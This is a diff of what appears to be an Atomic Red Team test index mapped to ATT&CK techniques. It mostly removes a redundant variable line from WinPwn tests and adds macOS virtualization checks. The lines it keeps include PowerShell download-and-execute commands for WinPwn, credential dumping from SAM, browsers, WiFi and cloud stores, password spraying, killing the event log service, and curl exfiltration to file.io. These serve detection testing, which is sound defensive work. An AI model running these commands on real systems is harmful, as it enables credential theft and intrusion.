@@ -1903,8 +1903,7 @@ input_arguments.limit.type: integer
 input_arguments.limit.default: 10
 
 "
-T1003.002,OS Credential Dumping: Security Account Manager,WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes,0c0f5f06-166a-4f4d-bb4a-719df9a01dbb,Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1003.002,OS Credential Dumping: Security Account Manager,WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes,0c0f5f06-166a-4f4d-bb4a-719df9a01dbb,Loot local Credentials - Dump SAM-File for NTLM Hashes technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 samfile -consoleoutput -noninteractive  ",powershell,,,,,,
 T1003.002,OS Credential Dumping: Security Account Manager,"Dumping of SAM, creds, and secrets(Reg Export)",21df41be-cdd8-4695-a650-c3981113aa3c,"Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated via three registry keys. Used reg export to execute this behavior
 Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.
@@ -2465,8 +2464,7 @@ input_arguments.valid_password.type: string
 input_arguments.valid_password.default: iamthebatman
 
 "
-T1110.003,Brute Force: Password Spraying,WinPwn - DomainPasswordSpray Attacks,5ccf4bbd-7bf6-43fc-83ac-d9e38aff1d82,DomainPasswordSpray Attacks technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1110.003,Brute Force: Password Spraying,WinPwn - DomainPasswordSpray Attacks,5ccf4bbd-7bf6-43fc-83ac-d9e38aff1d82,DomainPasswordSpray Attacks technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 domainpassspray -consoleoutput -noninteractive -emptypasswords",powershell,,,,,,
 T1110.003,Brute Force: Password Spraying,Password Spray Invoke-DomainPasswordSpray Light,b15bc9a5-a4f3-4879-9304-ea0011ace63a,"Perform a domain password spray using the same core method of the [DomainPasswordSpray tool](https://github.com/dafthack/DomainPasswordSpray) 
 but without all the extra code that makes the script get blocked by many AVs. 
@@ -3748,17 +3746,13 @@ input_arguments.file_path.type: string
 input_arguments.file_path.default: /home
 
 "
-T1552.001,Unsecured Credentials: Credentials In Files,WinPwn - sensitivefiles,114dd4e3-8d1c-4ea7-bb8d-8d8f6aca21f0,Search for sensitive files on this local system using the SensitiveFiles function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1552.001,Unsecured Credentials: Credentials In Files,WinPwn - sensitivefiles,114dd4e3-8d1c-4ea7-bb8d-8d8f6aca21f0,Search for sensitive files on this local system using the SensitiveFiles function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 sensitivefiles -noninteractive -consoleoutput",powershell,,,,,,
-T1552.001,Unsecured Credentials: Credentials In Files,WinPwn - Snaffler,fdd0c913-714b-4c13-b40f-1824d6c015f2,Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1552.001,Unsecured Credentials: Credentials In Files,WinPwn - Snaffler,fdd0c913-714b-4c13-b40f-1824d6c015f2,Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 Snaffler -noninteractive -consoleoutput",powershell,,,,,,
-T1552.001,Unsecured Credentials: Credentials In Files,WinPwn - powershellsensitive,75f66e03-37d3-4704-9520-3210efbe33ce,Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1552.001,Unsecured Credentials: Credentials In Files,WinPwn - powershellsensitive,75f66e03-37d3-4704-9520-3210efbe33ce,Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 powershellsensitive -consoleoutput -noninteractive",powershell,,,,,,
-T1552.001,Unsecured Credentials: Credentials In Files,WinPwn - passhunt,00e3e3c7-6c3c-455e-bd4b-461c7f0e7797,Search for Passwords on this system using passhunt via WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1552.001,Unsecured Credentials: Credentials In Files,WinPwn - passhunt,00e3e3c7-6c3c-455e-bd4b-461c7f0e7797,Search for Passwords on this system using passhunt via WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 passhunt -local $true -noninteractive",powershell,,,"rm -force .\passhunt.exe -ErrorAction Ignore
 rm -force .\phunter* -ErrorAction Ignore
 rm -force -recurse .\DomainRecon -ErrorAction Ignore
@@ -3766,11 +3760,9 @@ rm -force -recurse .\Exploitation -ErrorAction Ignore
 rm -force -recurse .\LocalPrivEsc -ErrorAction Ignore
 rm -force -recurse .\LocalRecon -ErrorAction Ignore
 rm -force -recurse .\Vulnerabilities -ErrorAction Ignore",,,
-T1552.001,Unsecured Credentials: Credentials In Files,WinPwn - SessionGopher,c9dc9de3-f961-4284-bd2d-f959c9f9fda5,Launches SessionGopher on this system via WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1552.001,Unsecured Credentials: Credentials In Files,WinPwn - SessionGopher,c9dc9de3-f961-4284-bd2d-f959c9f9fda5,Launches SessionGopher on this system via WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 sessionGopher -noninteractive -consoleoutput",powershell,,,,,,
-T1552.001,Unsecured Credentials: Credentials In Files,"WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials",aaa87b0e-5232-4649-ae5c-f1724a4b2798,"Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials technique via function of WinPwn",windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1552.001,Unsecured Credentials: Credentials In Files,"WinPwn - Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials",aaa87b0e-5232-4649-ae5c-f1724a4b2798,"Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials technique via function of WinPwn",windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 SharpCloud -consoleoutput -noninteractive  ",powershell,,,,,,
 T1552.001,Unsecured Credentials: Credentials In Files,List Credential Files via PowerShell,0d4f2281-f720-4572-adc8-d5bb1618affe,"Via PowerShell,list files where credentials are stored in Windows Credential Manager
 ",windows,,,"$usernameinfo = (Get-ChildItem Env:USERNAME).Value
@@ -4215,11 +4207,9 @@ compress-archive -path ""$exfil_folder"" -destinationpath ""$exfil_folder.zip"" 
 ",powershell,,,"Remove-Item -Path ""$env:temp\T1555.003.zip"" -force -erroraction silentlycontinue   
 Remove-Item -Path ""$env:temp\T1555.003\"" -force -recurse -erroraction silentlycontinue
 ",,,
-T1555.003,Credentials from Password Stores: Credentials from Web Browsers,WinPwn - BrowserPwn,764ea176-fb71-494c-90ea-72e9d85dce76,Collect Browser credentials as well as the history via winpwn browserpwn function of WinPwn.,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1555.003,Credentials from Password Stores: Credentials from Web Browsers,WinPwn - BrowserPwn,764ea176-fb71-494c-90ea-72e9d85dce76,Collect Browser credentials as well as the history via winpwn browserpwn function of WinPwn.,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 browserpwn -consoleoutput -noninteractive",powershell,,,rm .\System.Data.SQLite.dll -ErrorAction Ignore,,,
-T1555.003,Credentials from Password Stores: Credentials from Web Browsers,WinPwn - Loot local Credentials - mimi-kittenz,ec1d0b37-f659-4186-869f-31a554891611,Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1555.003,Credentials from Password Stores: Credentials from Web Browsers,WinPwn - Loot local Credentials - mimi-kittenz,ec1d0b37-f659-4186-869f-31a554891611,Loot local Credentials - mimi-kittenz technique via function of WinPwn - Extend timeout to 600s,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 kittenz -consoleoutput -noninteractive",powershell,,,,,,
 T1555.003,Credentials from Password Stores: Credentials from Web Browsers,WinPwn - PowerSharpPack - Sharpweb for Browser Credentials,e5e3d639-6ea8-4408-9ecd-d5a286268ca0,PowerSharpPack - Sharpweb searching for Browser Credentials technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1')
 Invoke-Sharpweb -command ""all""",powershell,,,,,,
@@ -5958,14 +5948,11 @@ T1518,Software Discovery,Find and Display Safari Browser Version,103d6533-fd2a-4
 ",macos,,,"/usr/libexec/PlistBuddy -c ""print :CFBundleShortVersionString"" /Applications/Safari.app/Contents/Info.plist
 /usr/libexec/PlistBuddy -c ""print :CFBundleVersion"" /Applications/Safari.app/Contents/Info.plist
 ",sh,False,,,,,
-T1518,Software Discovery,WinPwn - Dotnetsearch,7e79a1b6-519e-433c-ad55-3ff293667101,Search for any .NET binary file in a share using the Dotnetsearch function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1518,Software Discovery,WinPwn - Dotnetsearch,7e79a1b6-519e-433c-ad55-3ff293667101,Search for any .NET binary file in a share using the Dotnetsearch function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 Dotnetsearch -noninteractive -consoleoutput",powershell,,,,,,
-T1518,Software Discovery,WinPwn - DotNet,10ba02d0-ab76-4f80-940d-451633f24c5b,Search for .NET Service-Binaries on this system via winpwn dotnet function of WinPwn.,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1518,Software Discovery,WinPwn - DotNet,10ba02d0-ab76-4f80-940d-451633f24c5b,Search for .NET Service-Binaries on this system via winpwn dotnet function of WinPwn.,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 dotnet -consoleoutput -noninteractive",powershell,,,,,,
-T1518,Software Discovery,WinPwn - powerSQL,0bb64470-582a-4155-bde2-d6003a95ed34,Start PowerUpSQL Checks using powerSQL function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1518,Software Discovery,WinPwn - powerSQL,0bb64470-582a-4155-bde2-d6003a95ed34,Start PowerUpSQL Checks using powerSQL function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 powerSQL -noninteractive -consoleoutput",powershell,,,,,,
 T1036,Masquerading,System File Copied to Unusual Location,51005ac7-52e2-45e0-bdab-d17c6d4916cd,It may be suspicious seeing a file copy of an EXE in System32 or SysWOW64 to a non-system directory or executing from a non-system directory.,windows,,,"copy-item ""$env:windir\System32\cmd.exe"" -destination ""$env:allusersprofile\cmd.exe""
 start-process ""$env:allusersprofile\cmd.exe""
@@ -6194,11 +6181,9 @@ T1078.003,Valid Accounts: Local Accounts,Enable root account using dsenableroot 
 dsenableroot -u art-tester -p art-tester -r art-root #new user",bash,True,,"dsenableroot -d #current user
 dsenableroot -d -u art-tester -p art-tester #new user",,,
 T1078.003,Valid Accounts: Local Accounts,Add a new/existing user to the admin group using dseditgroup utility - macOS,433842ba-e796-4fd5-a14f-95d3a1970875,After execution the current/new user will be added to the Admin group,macos,,,dseditgroup -o edit -a art-user -t user admin,bash,True,,dseditgroup -o edit -d art-user -t user admin,,,
-T1078.003,Valid Accounts: Local Accounts,WinPwn - Loot local Credentials - powerhell kittie,9e9fd066-453d-442f-88c1-ad7911d32912,Loot local Credentials - powerhell kittie technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1078.003,Valid Accounts: Local Accounts,WinPwn - Loot local Credentials - powerhell kittie,9e9fd066-453d-442f-88c1-ad7911d32912,Loot local Credentials - powerhell kittie technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 obfuskittiedump -consoleoutput -noninteractive",powershell,True,,,,,
-T1078.003,Valid Accounts: Local Accounts,WinPwn - Loot local Credentials - Safetykatz,e9fdb899-a980-4ba4-934b-486ad22e22f4,Loot local Credentials - Safetykatz technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1078.003,Valid Accounts: Local Accounts,WinPwn - Loot local Credentials - Safetykatz,e9fdb899-a980-4ba4-934b-486ad22e22f4,Loot local Credentials - Safetykatz technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 safedump -consoleoutput -noninteractive",powershell,True,,,,,
 T1078.003,Valid Accounts: Local Accounts,Create local account (Linux),02a91c34-8a5b-4bed-87af-501103eb5357,"An adversary may wish to create an account with admin privileges to work with. In this test we create a ""art"" user with the password art, switch to art, execute whoami, exit and delete the art user.
 ",linux,,,"password=$(openssl passwd -1 art)
@@ -7054,17 +7039,13 @@ input_arguments.filename.type: path
 input_arguments.filename.default: PathToAtomicsFolder\T1046\src\T1046.py
 
 "
-T1046,Network Service Discovery,WinPwn - spoolvulnscan,54574908-f1de-4356-9021-8053dd57439a,Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1046,Network Service Discovery,WinPwn - spoolvulnscan,54574908-f1de-4356-9021-8053dd57439a,Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 spoolvulnscan -noninteractive -consoleoutput",powershell,,,,,,
-T1046,Network Service Discovery,WinPwn - MS17-10,97585b04-5be2-40e9-8c31-82157b8af2d6,Search for MS17-10 vulnerable Windows Servers in the domain using powerSQL function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1046,Network Service Discovery,WinPwn - MS17-10,97585b04-5be2-40e9-8c31-82157b8af2d6,Search for MS17-10 vulnerable Windows Servers in the domain using powerSQL function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 MS17-10 -noninteractive -consoleoutput",powershell,,,,,,
-T1046,Network Service Discovery,WinPwn - bluekeep,1cca5640-32a9-46e6-b8e0-fabbe2384a73,Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1046,Network Service Discovery,WinPwn - bluekeep,1cca5640-32a9-46e6-b8e0-fabbe2384a73,Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 bluekeep -noninteractive -consoleoutput",powershell,,,,,,
-T1046,Network Service Discovery,WinPwn - fruit,bb037826-cbe8-4a41-93ea-b94059d6bb98,Search for potentially vulnerable web apps (low hanging fruits) using fruit function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1046,Network Service Discovery,WinPwn - fruit,bb037826-cbe8-4a41-93ea-b94059d6bb98,Search for potentially vulnerable web apps (low hanging fruits) using fruit function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 fruit -noninteractive -consoleoutput",powershell,,,,,,
 T1046,Network Service Discovery,Network Service Discovery for Containers,06eaafdb-8982-426e-8a31-d572da633caa,"Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.",containers,,,"docker build -t t1046 $PathToAtomicsFolder/T1046/src/
 docker run --name t1046_container --rm -d -t t1046
@@ -7238,7 +7219,7 @@ Get-WmiObject -Query ""SELECT * FROM MSAcpi_ThermalZoneTemperature"" -ErrorActio
 if($error) {echo ""Virtualization Environment detected""}
 ",powershell,False,,"$error.clear()
 ",,,
-T1497.001,Virtualization/Sandbox Evasion: System Checks,Detect Virtualization Environment (MacOS),a960185f-aef6-4547-8350-d1ce16680d09,"ioreg contains registry entries for all the device drivers in the system. If it's a virtual machine, one of the device manufacturer will be a Virtualization Software.
+T1497.001,Virtualization/Sandbox Evasion: System Checks,Detect Virtualization Environment via ioreg,a960185f-aef6-4547-8350-d1ce16680d09,"ioreg contains registry entries for all the device drivers in the system. If it's a virtual machine, one of the device manufacturer will be a Virtualization Software.
 ",macos,,,"if (ioreg -l | grep -e Manufacturer -e 'Vendor Name' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo 'Virtualization Environment detected'; fi;
 ",sh,False,,,,,
 T1497.001,Virtualization/Sandbox Evasion: System Checks,Detect Virtualization Environment via WMI Manufacturer/Model Listing (Windows),4a41089a-48e0-47aa-82cb-5b81a463bc78,"Windows Management Instrumentation(WMI) objects contain system information which helps to detect virtualization. This test will get the model and manufacturer of the machine to determine if it is a virtual machine, such as through VMware or VirtualBox. 
@@ -7246,6 +7227,21 @@ T1497.001,Virtualization/Sandbox Evasion: System Checks,Detect Virtualization En
 $Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty ""Model""
 if((($Manufacturer.ToLower() -eq ""microsoft corporation"") -and ($Model.ToLower().contains(""virtual""))) -or ($Manufacturer.ToLower().contains(""vmware"")) -or ($Model.ToLower() -eq ""virtualbox"")) {write-host ""Virtualization environment detected!""} else {write-host ""No virtualization environment detected!""}
 ",powershell,False,,,,,
+T1497.001,Virtualization/Sandbox Evasion: System Checks,Detect Virtualization Environment using sysctl (hw.model),6beae646-eb4c-4730-95be-691a4094408c,"sysctl hw.model will return the model name of the hardware(Macmini8,1, MacBookAir10,1, etc.) in case of native Apple hardware
+but will return the hypervisor name (VMware7,0).
+Reference: https://evasions.checkpoint.com/src/MacOS/macos.html#hardware-model
+",macos,,,"if [ ""$(sysctl -n hw.model | grep -v 'Mac')"" != """" ]; then echo 'Virtualization Environment detected'; fi;
+",sh,,,,,,
+T1497.001,Virtualization/Sandbox Evasion: System Checks,Check if System Integrity Protection is enabled,2b73cd9b-b2fb-4357-b9d7-c73c41d9e945,"The latest versions of macOS have the System Integrity Protection feature (SIP). If a sandbox uses a non-signed 
+kernel extension for monitoring purposes the, SIP feature must be disabled to load this kind of kernel extension.
+Malware may check if the SIP is enabled.
+Reference: https://evasions.checkpoint.com/src/MacOS/macos.html#sip
+",macos,,,"if [ ""$(csrutil status | grep -v 'enabled')"" != """" ]; then echo 'Possible Virtualization Environment detected'; fi;
+",sh,,,,,,
+T1497.001,Virtualization/Sandbox Evasion: System Checks,Detect Virtualization Environment using system_profiler,e04d2e89-de15-4d90-92f9-a335c7337f0f,"system_profiler provides system hardware and software configuration and the Model Identifier should provide the value similar to (sysctl -n hw.model). 
+We should be able to find whether virtualization is enabled by checking whether the Model Identifier does not contain ""Mac"".
+",macos,,,"if [ ""$(system_profiler SPHardwareDataType | grep ""Model Identifier"" | grep -v 'Mac')"" != """" ]; then echo 'Virtualization Environment detected'; fi;
+",sh,,,,,,
 T1048.002,Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,Exfiltrate data HTTPS using curl windows,1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0,"Exfiltrate data HTTPS using curl to file share site file.io
 ",windows,,,"#{curl_path} -k -F ""file=@#{input_file}"" https://file.io/
 ",command_prompt,False,,,powershell,"dependencies.0.description: Curl must be installed on system.
@@ -8271,14 +8267,11 @@ T1555,Credentials from Password Stores,Enumerate credentials from Windows Creden
 ",powershell,False,,,,,
 T1555,Credentials from Password Stores,WinPwn - Loot local Credentials - lazagne,079ee2e9-6f16-47ca-a635-14efcd994118,"The [LaZagne project](https://github.com/AlessandroZ/LaZagne) is an open source application used to retrieve lots of passwords stored on a local computer. 
 Each software stores its passwords using different techniques (plaintext, APIs, custom algorithms, databases, etc.). 
-This tool has been developed for the purpose of finding these passwords for the most commonly-used software",windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+This tool has been developed for the purpose of finding these passwords for the most commonly-used software",windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 lazagnemodule -consoleoutput -noninteractive",powershell,,,,,,
-T1555,Credentials from Password Stores,WinPwn - Loot local Credentials - Wifi Credentials,afe369c2-b42e-447f-98a3-fb1f4e2b8552,Loot local Credentials - Wifi Credentials technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1555,Credentials from Password Stores,WinPwn - Loot local Credentials - Wifi Credentials,afe369c2-b42e-447f-98a3-fb1f4e2b8552,Loot local Credentials - Wifi Credentials technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 wificreds -consoleoutput -noninteractive  ",powershell,,,,,,
-T1555,Credentials from Password Stores,WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords,db965264-3117-4bad-b7b7-2523b7856b92,Loot local Credentials - Decrypt Teamviewer Passwords technique via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+T1555,Credentials from Password Stores,WinPwn - Loot local Credentials - Decrypt Teamviewer Passwords,db965264-3117-4bad-b7b7-2523b7856b92,Loot local Credentials - Decrypt Teamviewer Passwords technique via function of WinPwn,windows,,,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 decryptteamviewer -consoleoutput -noninteractive  ",powershell,,,,,,
 T1542.001,Pre-OS Boot: System Firmware,UEFI Persistence via Wpbbin.exe File Creation,b8a49f03-e3c4-40f2-b7bb-9e8f8fdddbf1,"Creates Wpbbin.exe in %systemroot%. This technique can be used for UEFI-based pre-OS boot persistence mechanisms.
 - https://grzegorztworek.medium.com/using-uefi-to-inject-executable-files-into-bitlocker-protected-drives-8ff4ca59c94c
@@ -9398,8 +9391,7 @@ input_arguments.process_name.type: string
 input_arguments.process_name.default: MsMpEng.exe
 
 "
-T1562.001,Impair Defenses: Disable or Modify Tools,WinPwn - Kill the event log services for stealth,7869d7a3-3a30-4d2c-a5d2-f1cd9c34ce66,Kill the event log services for stealth via function of WinPwn,windows,,,"$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
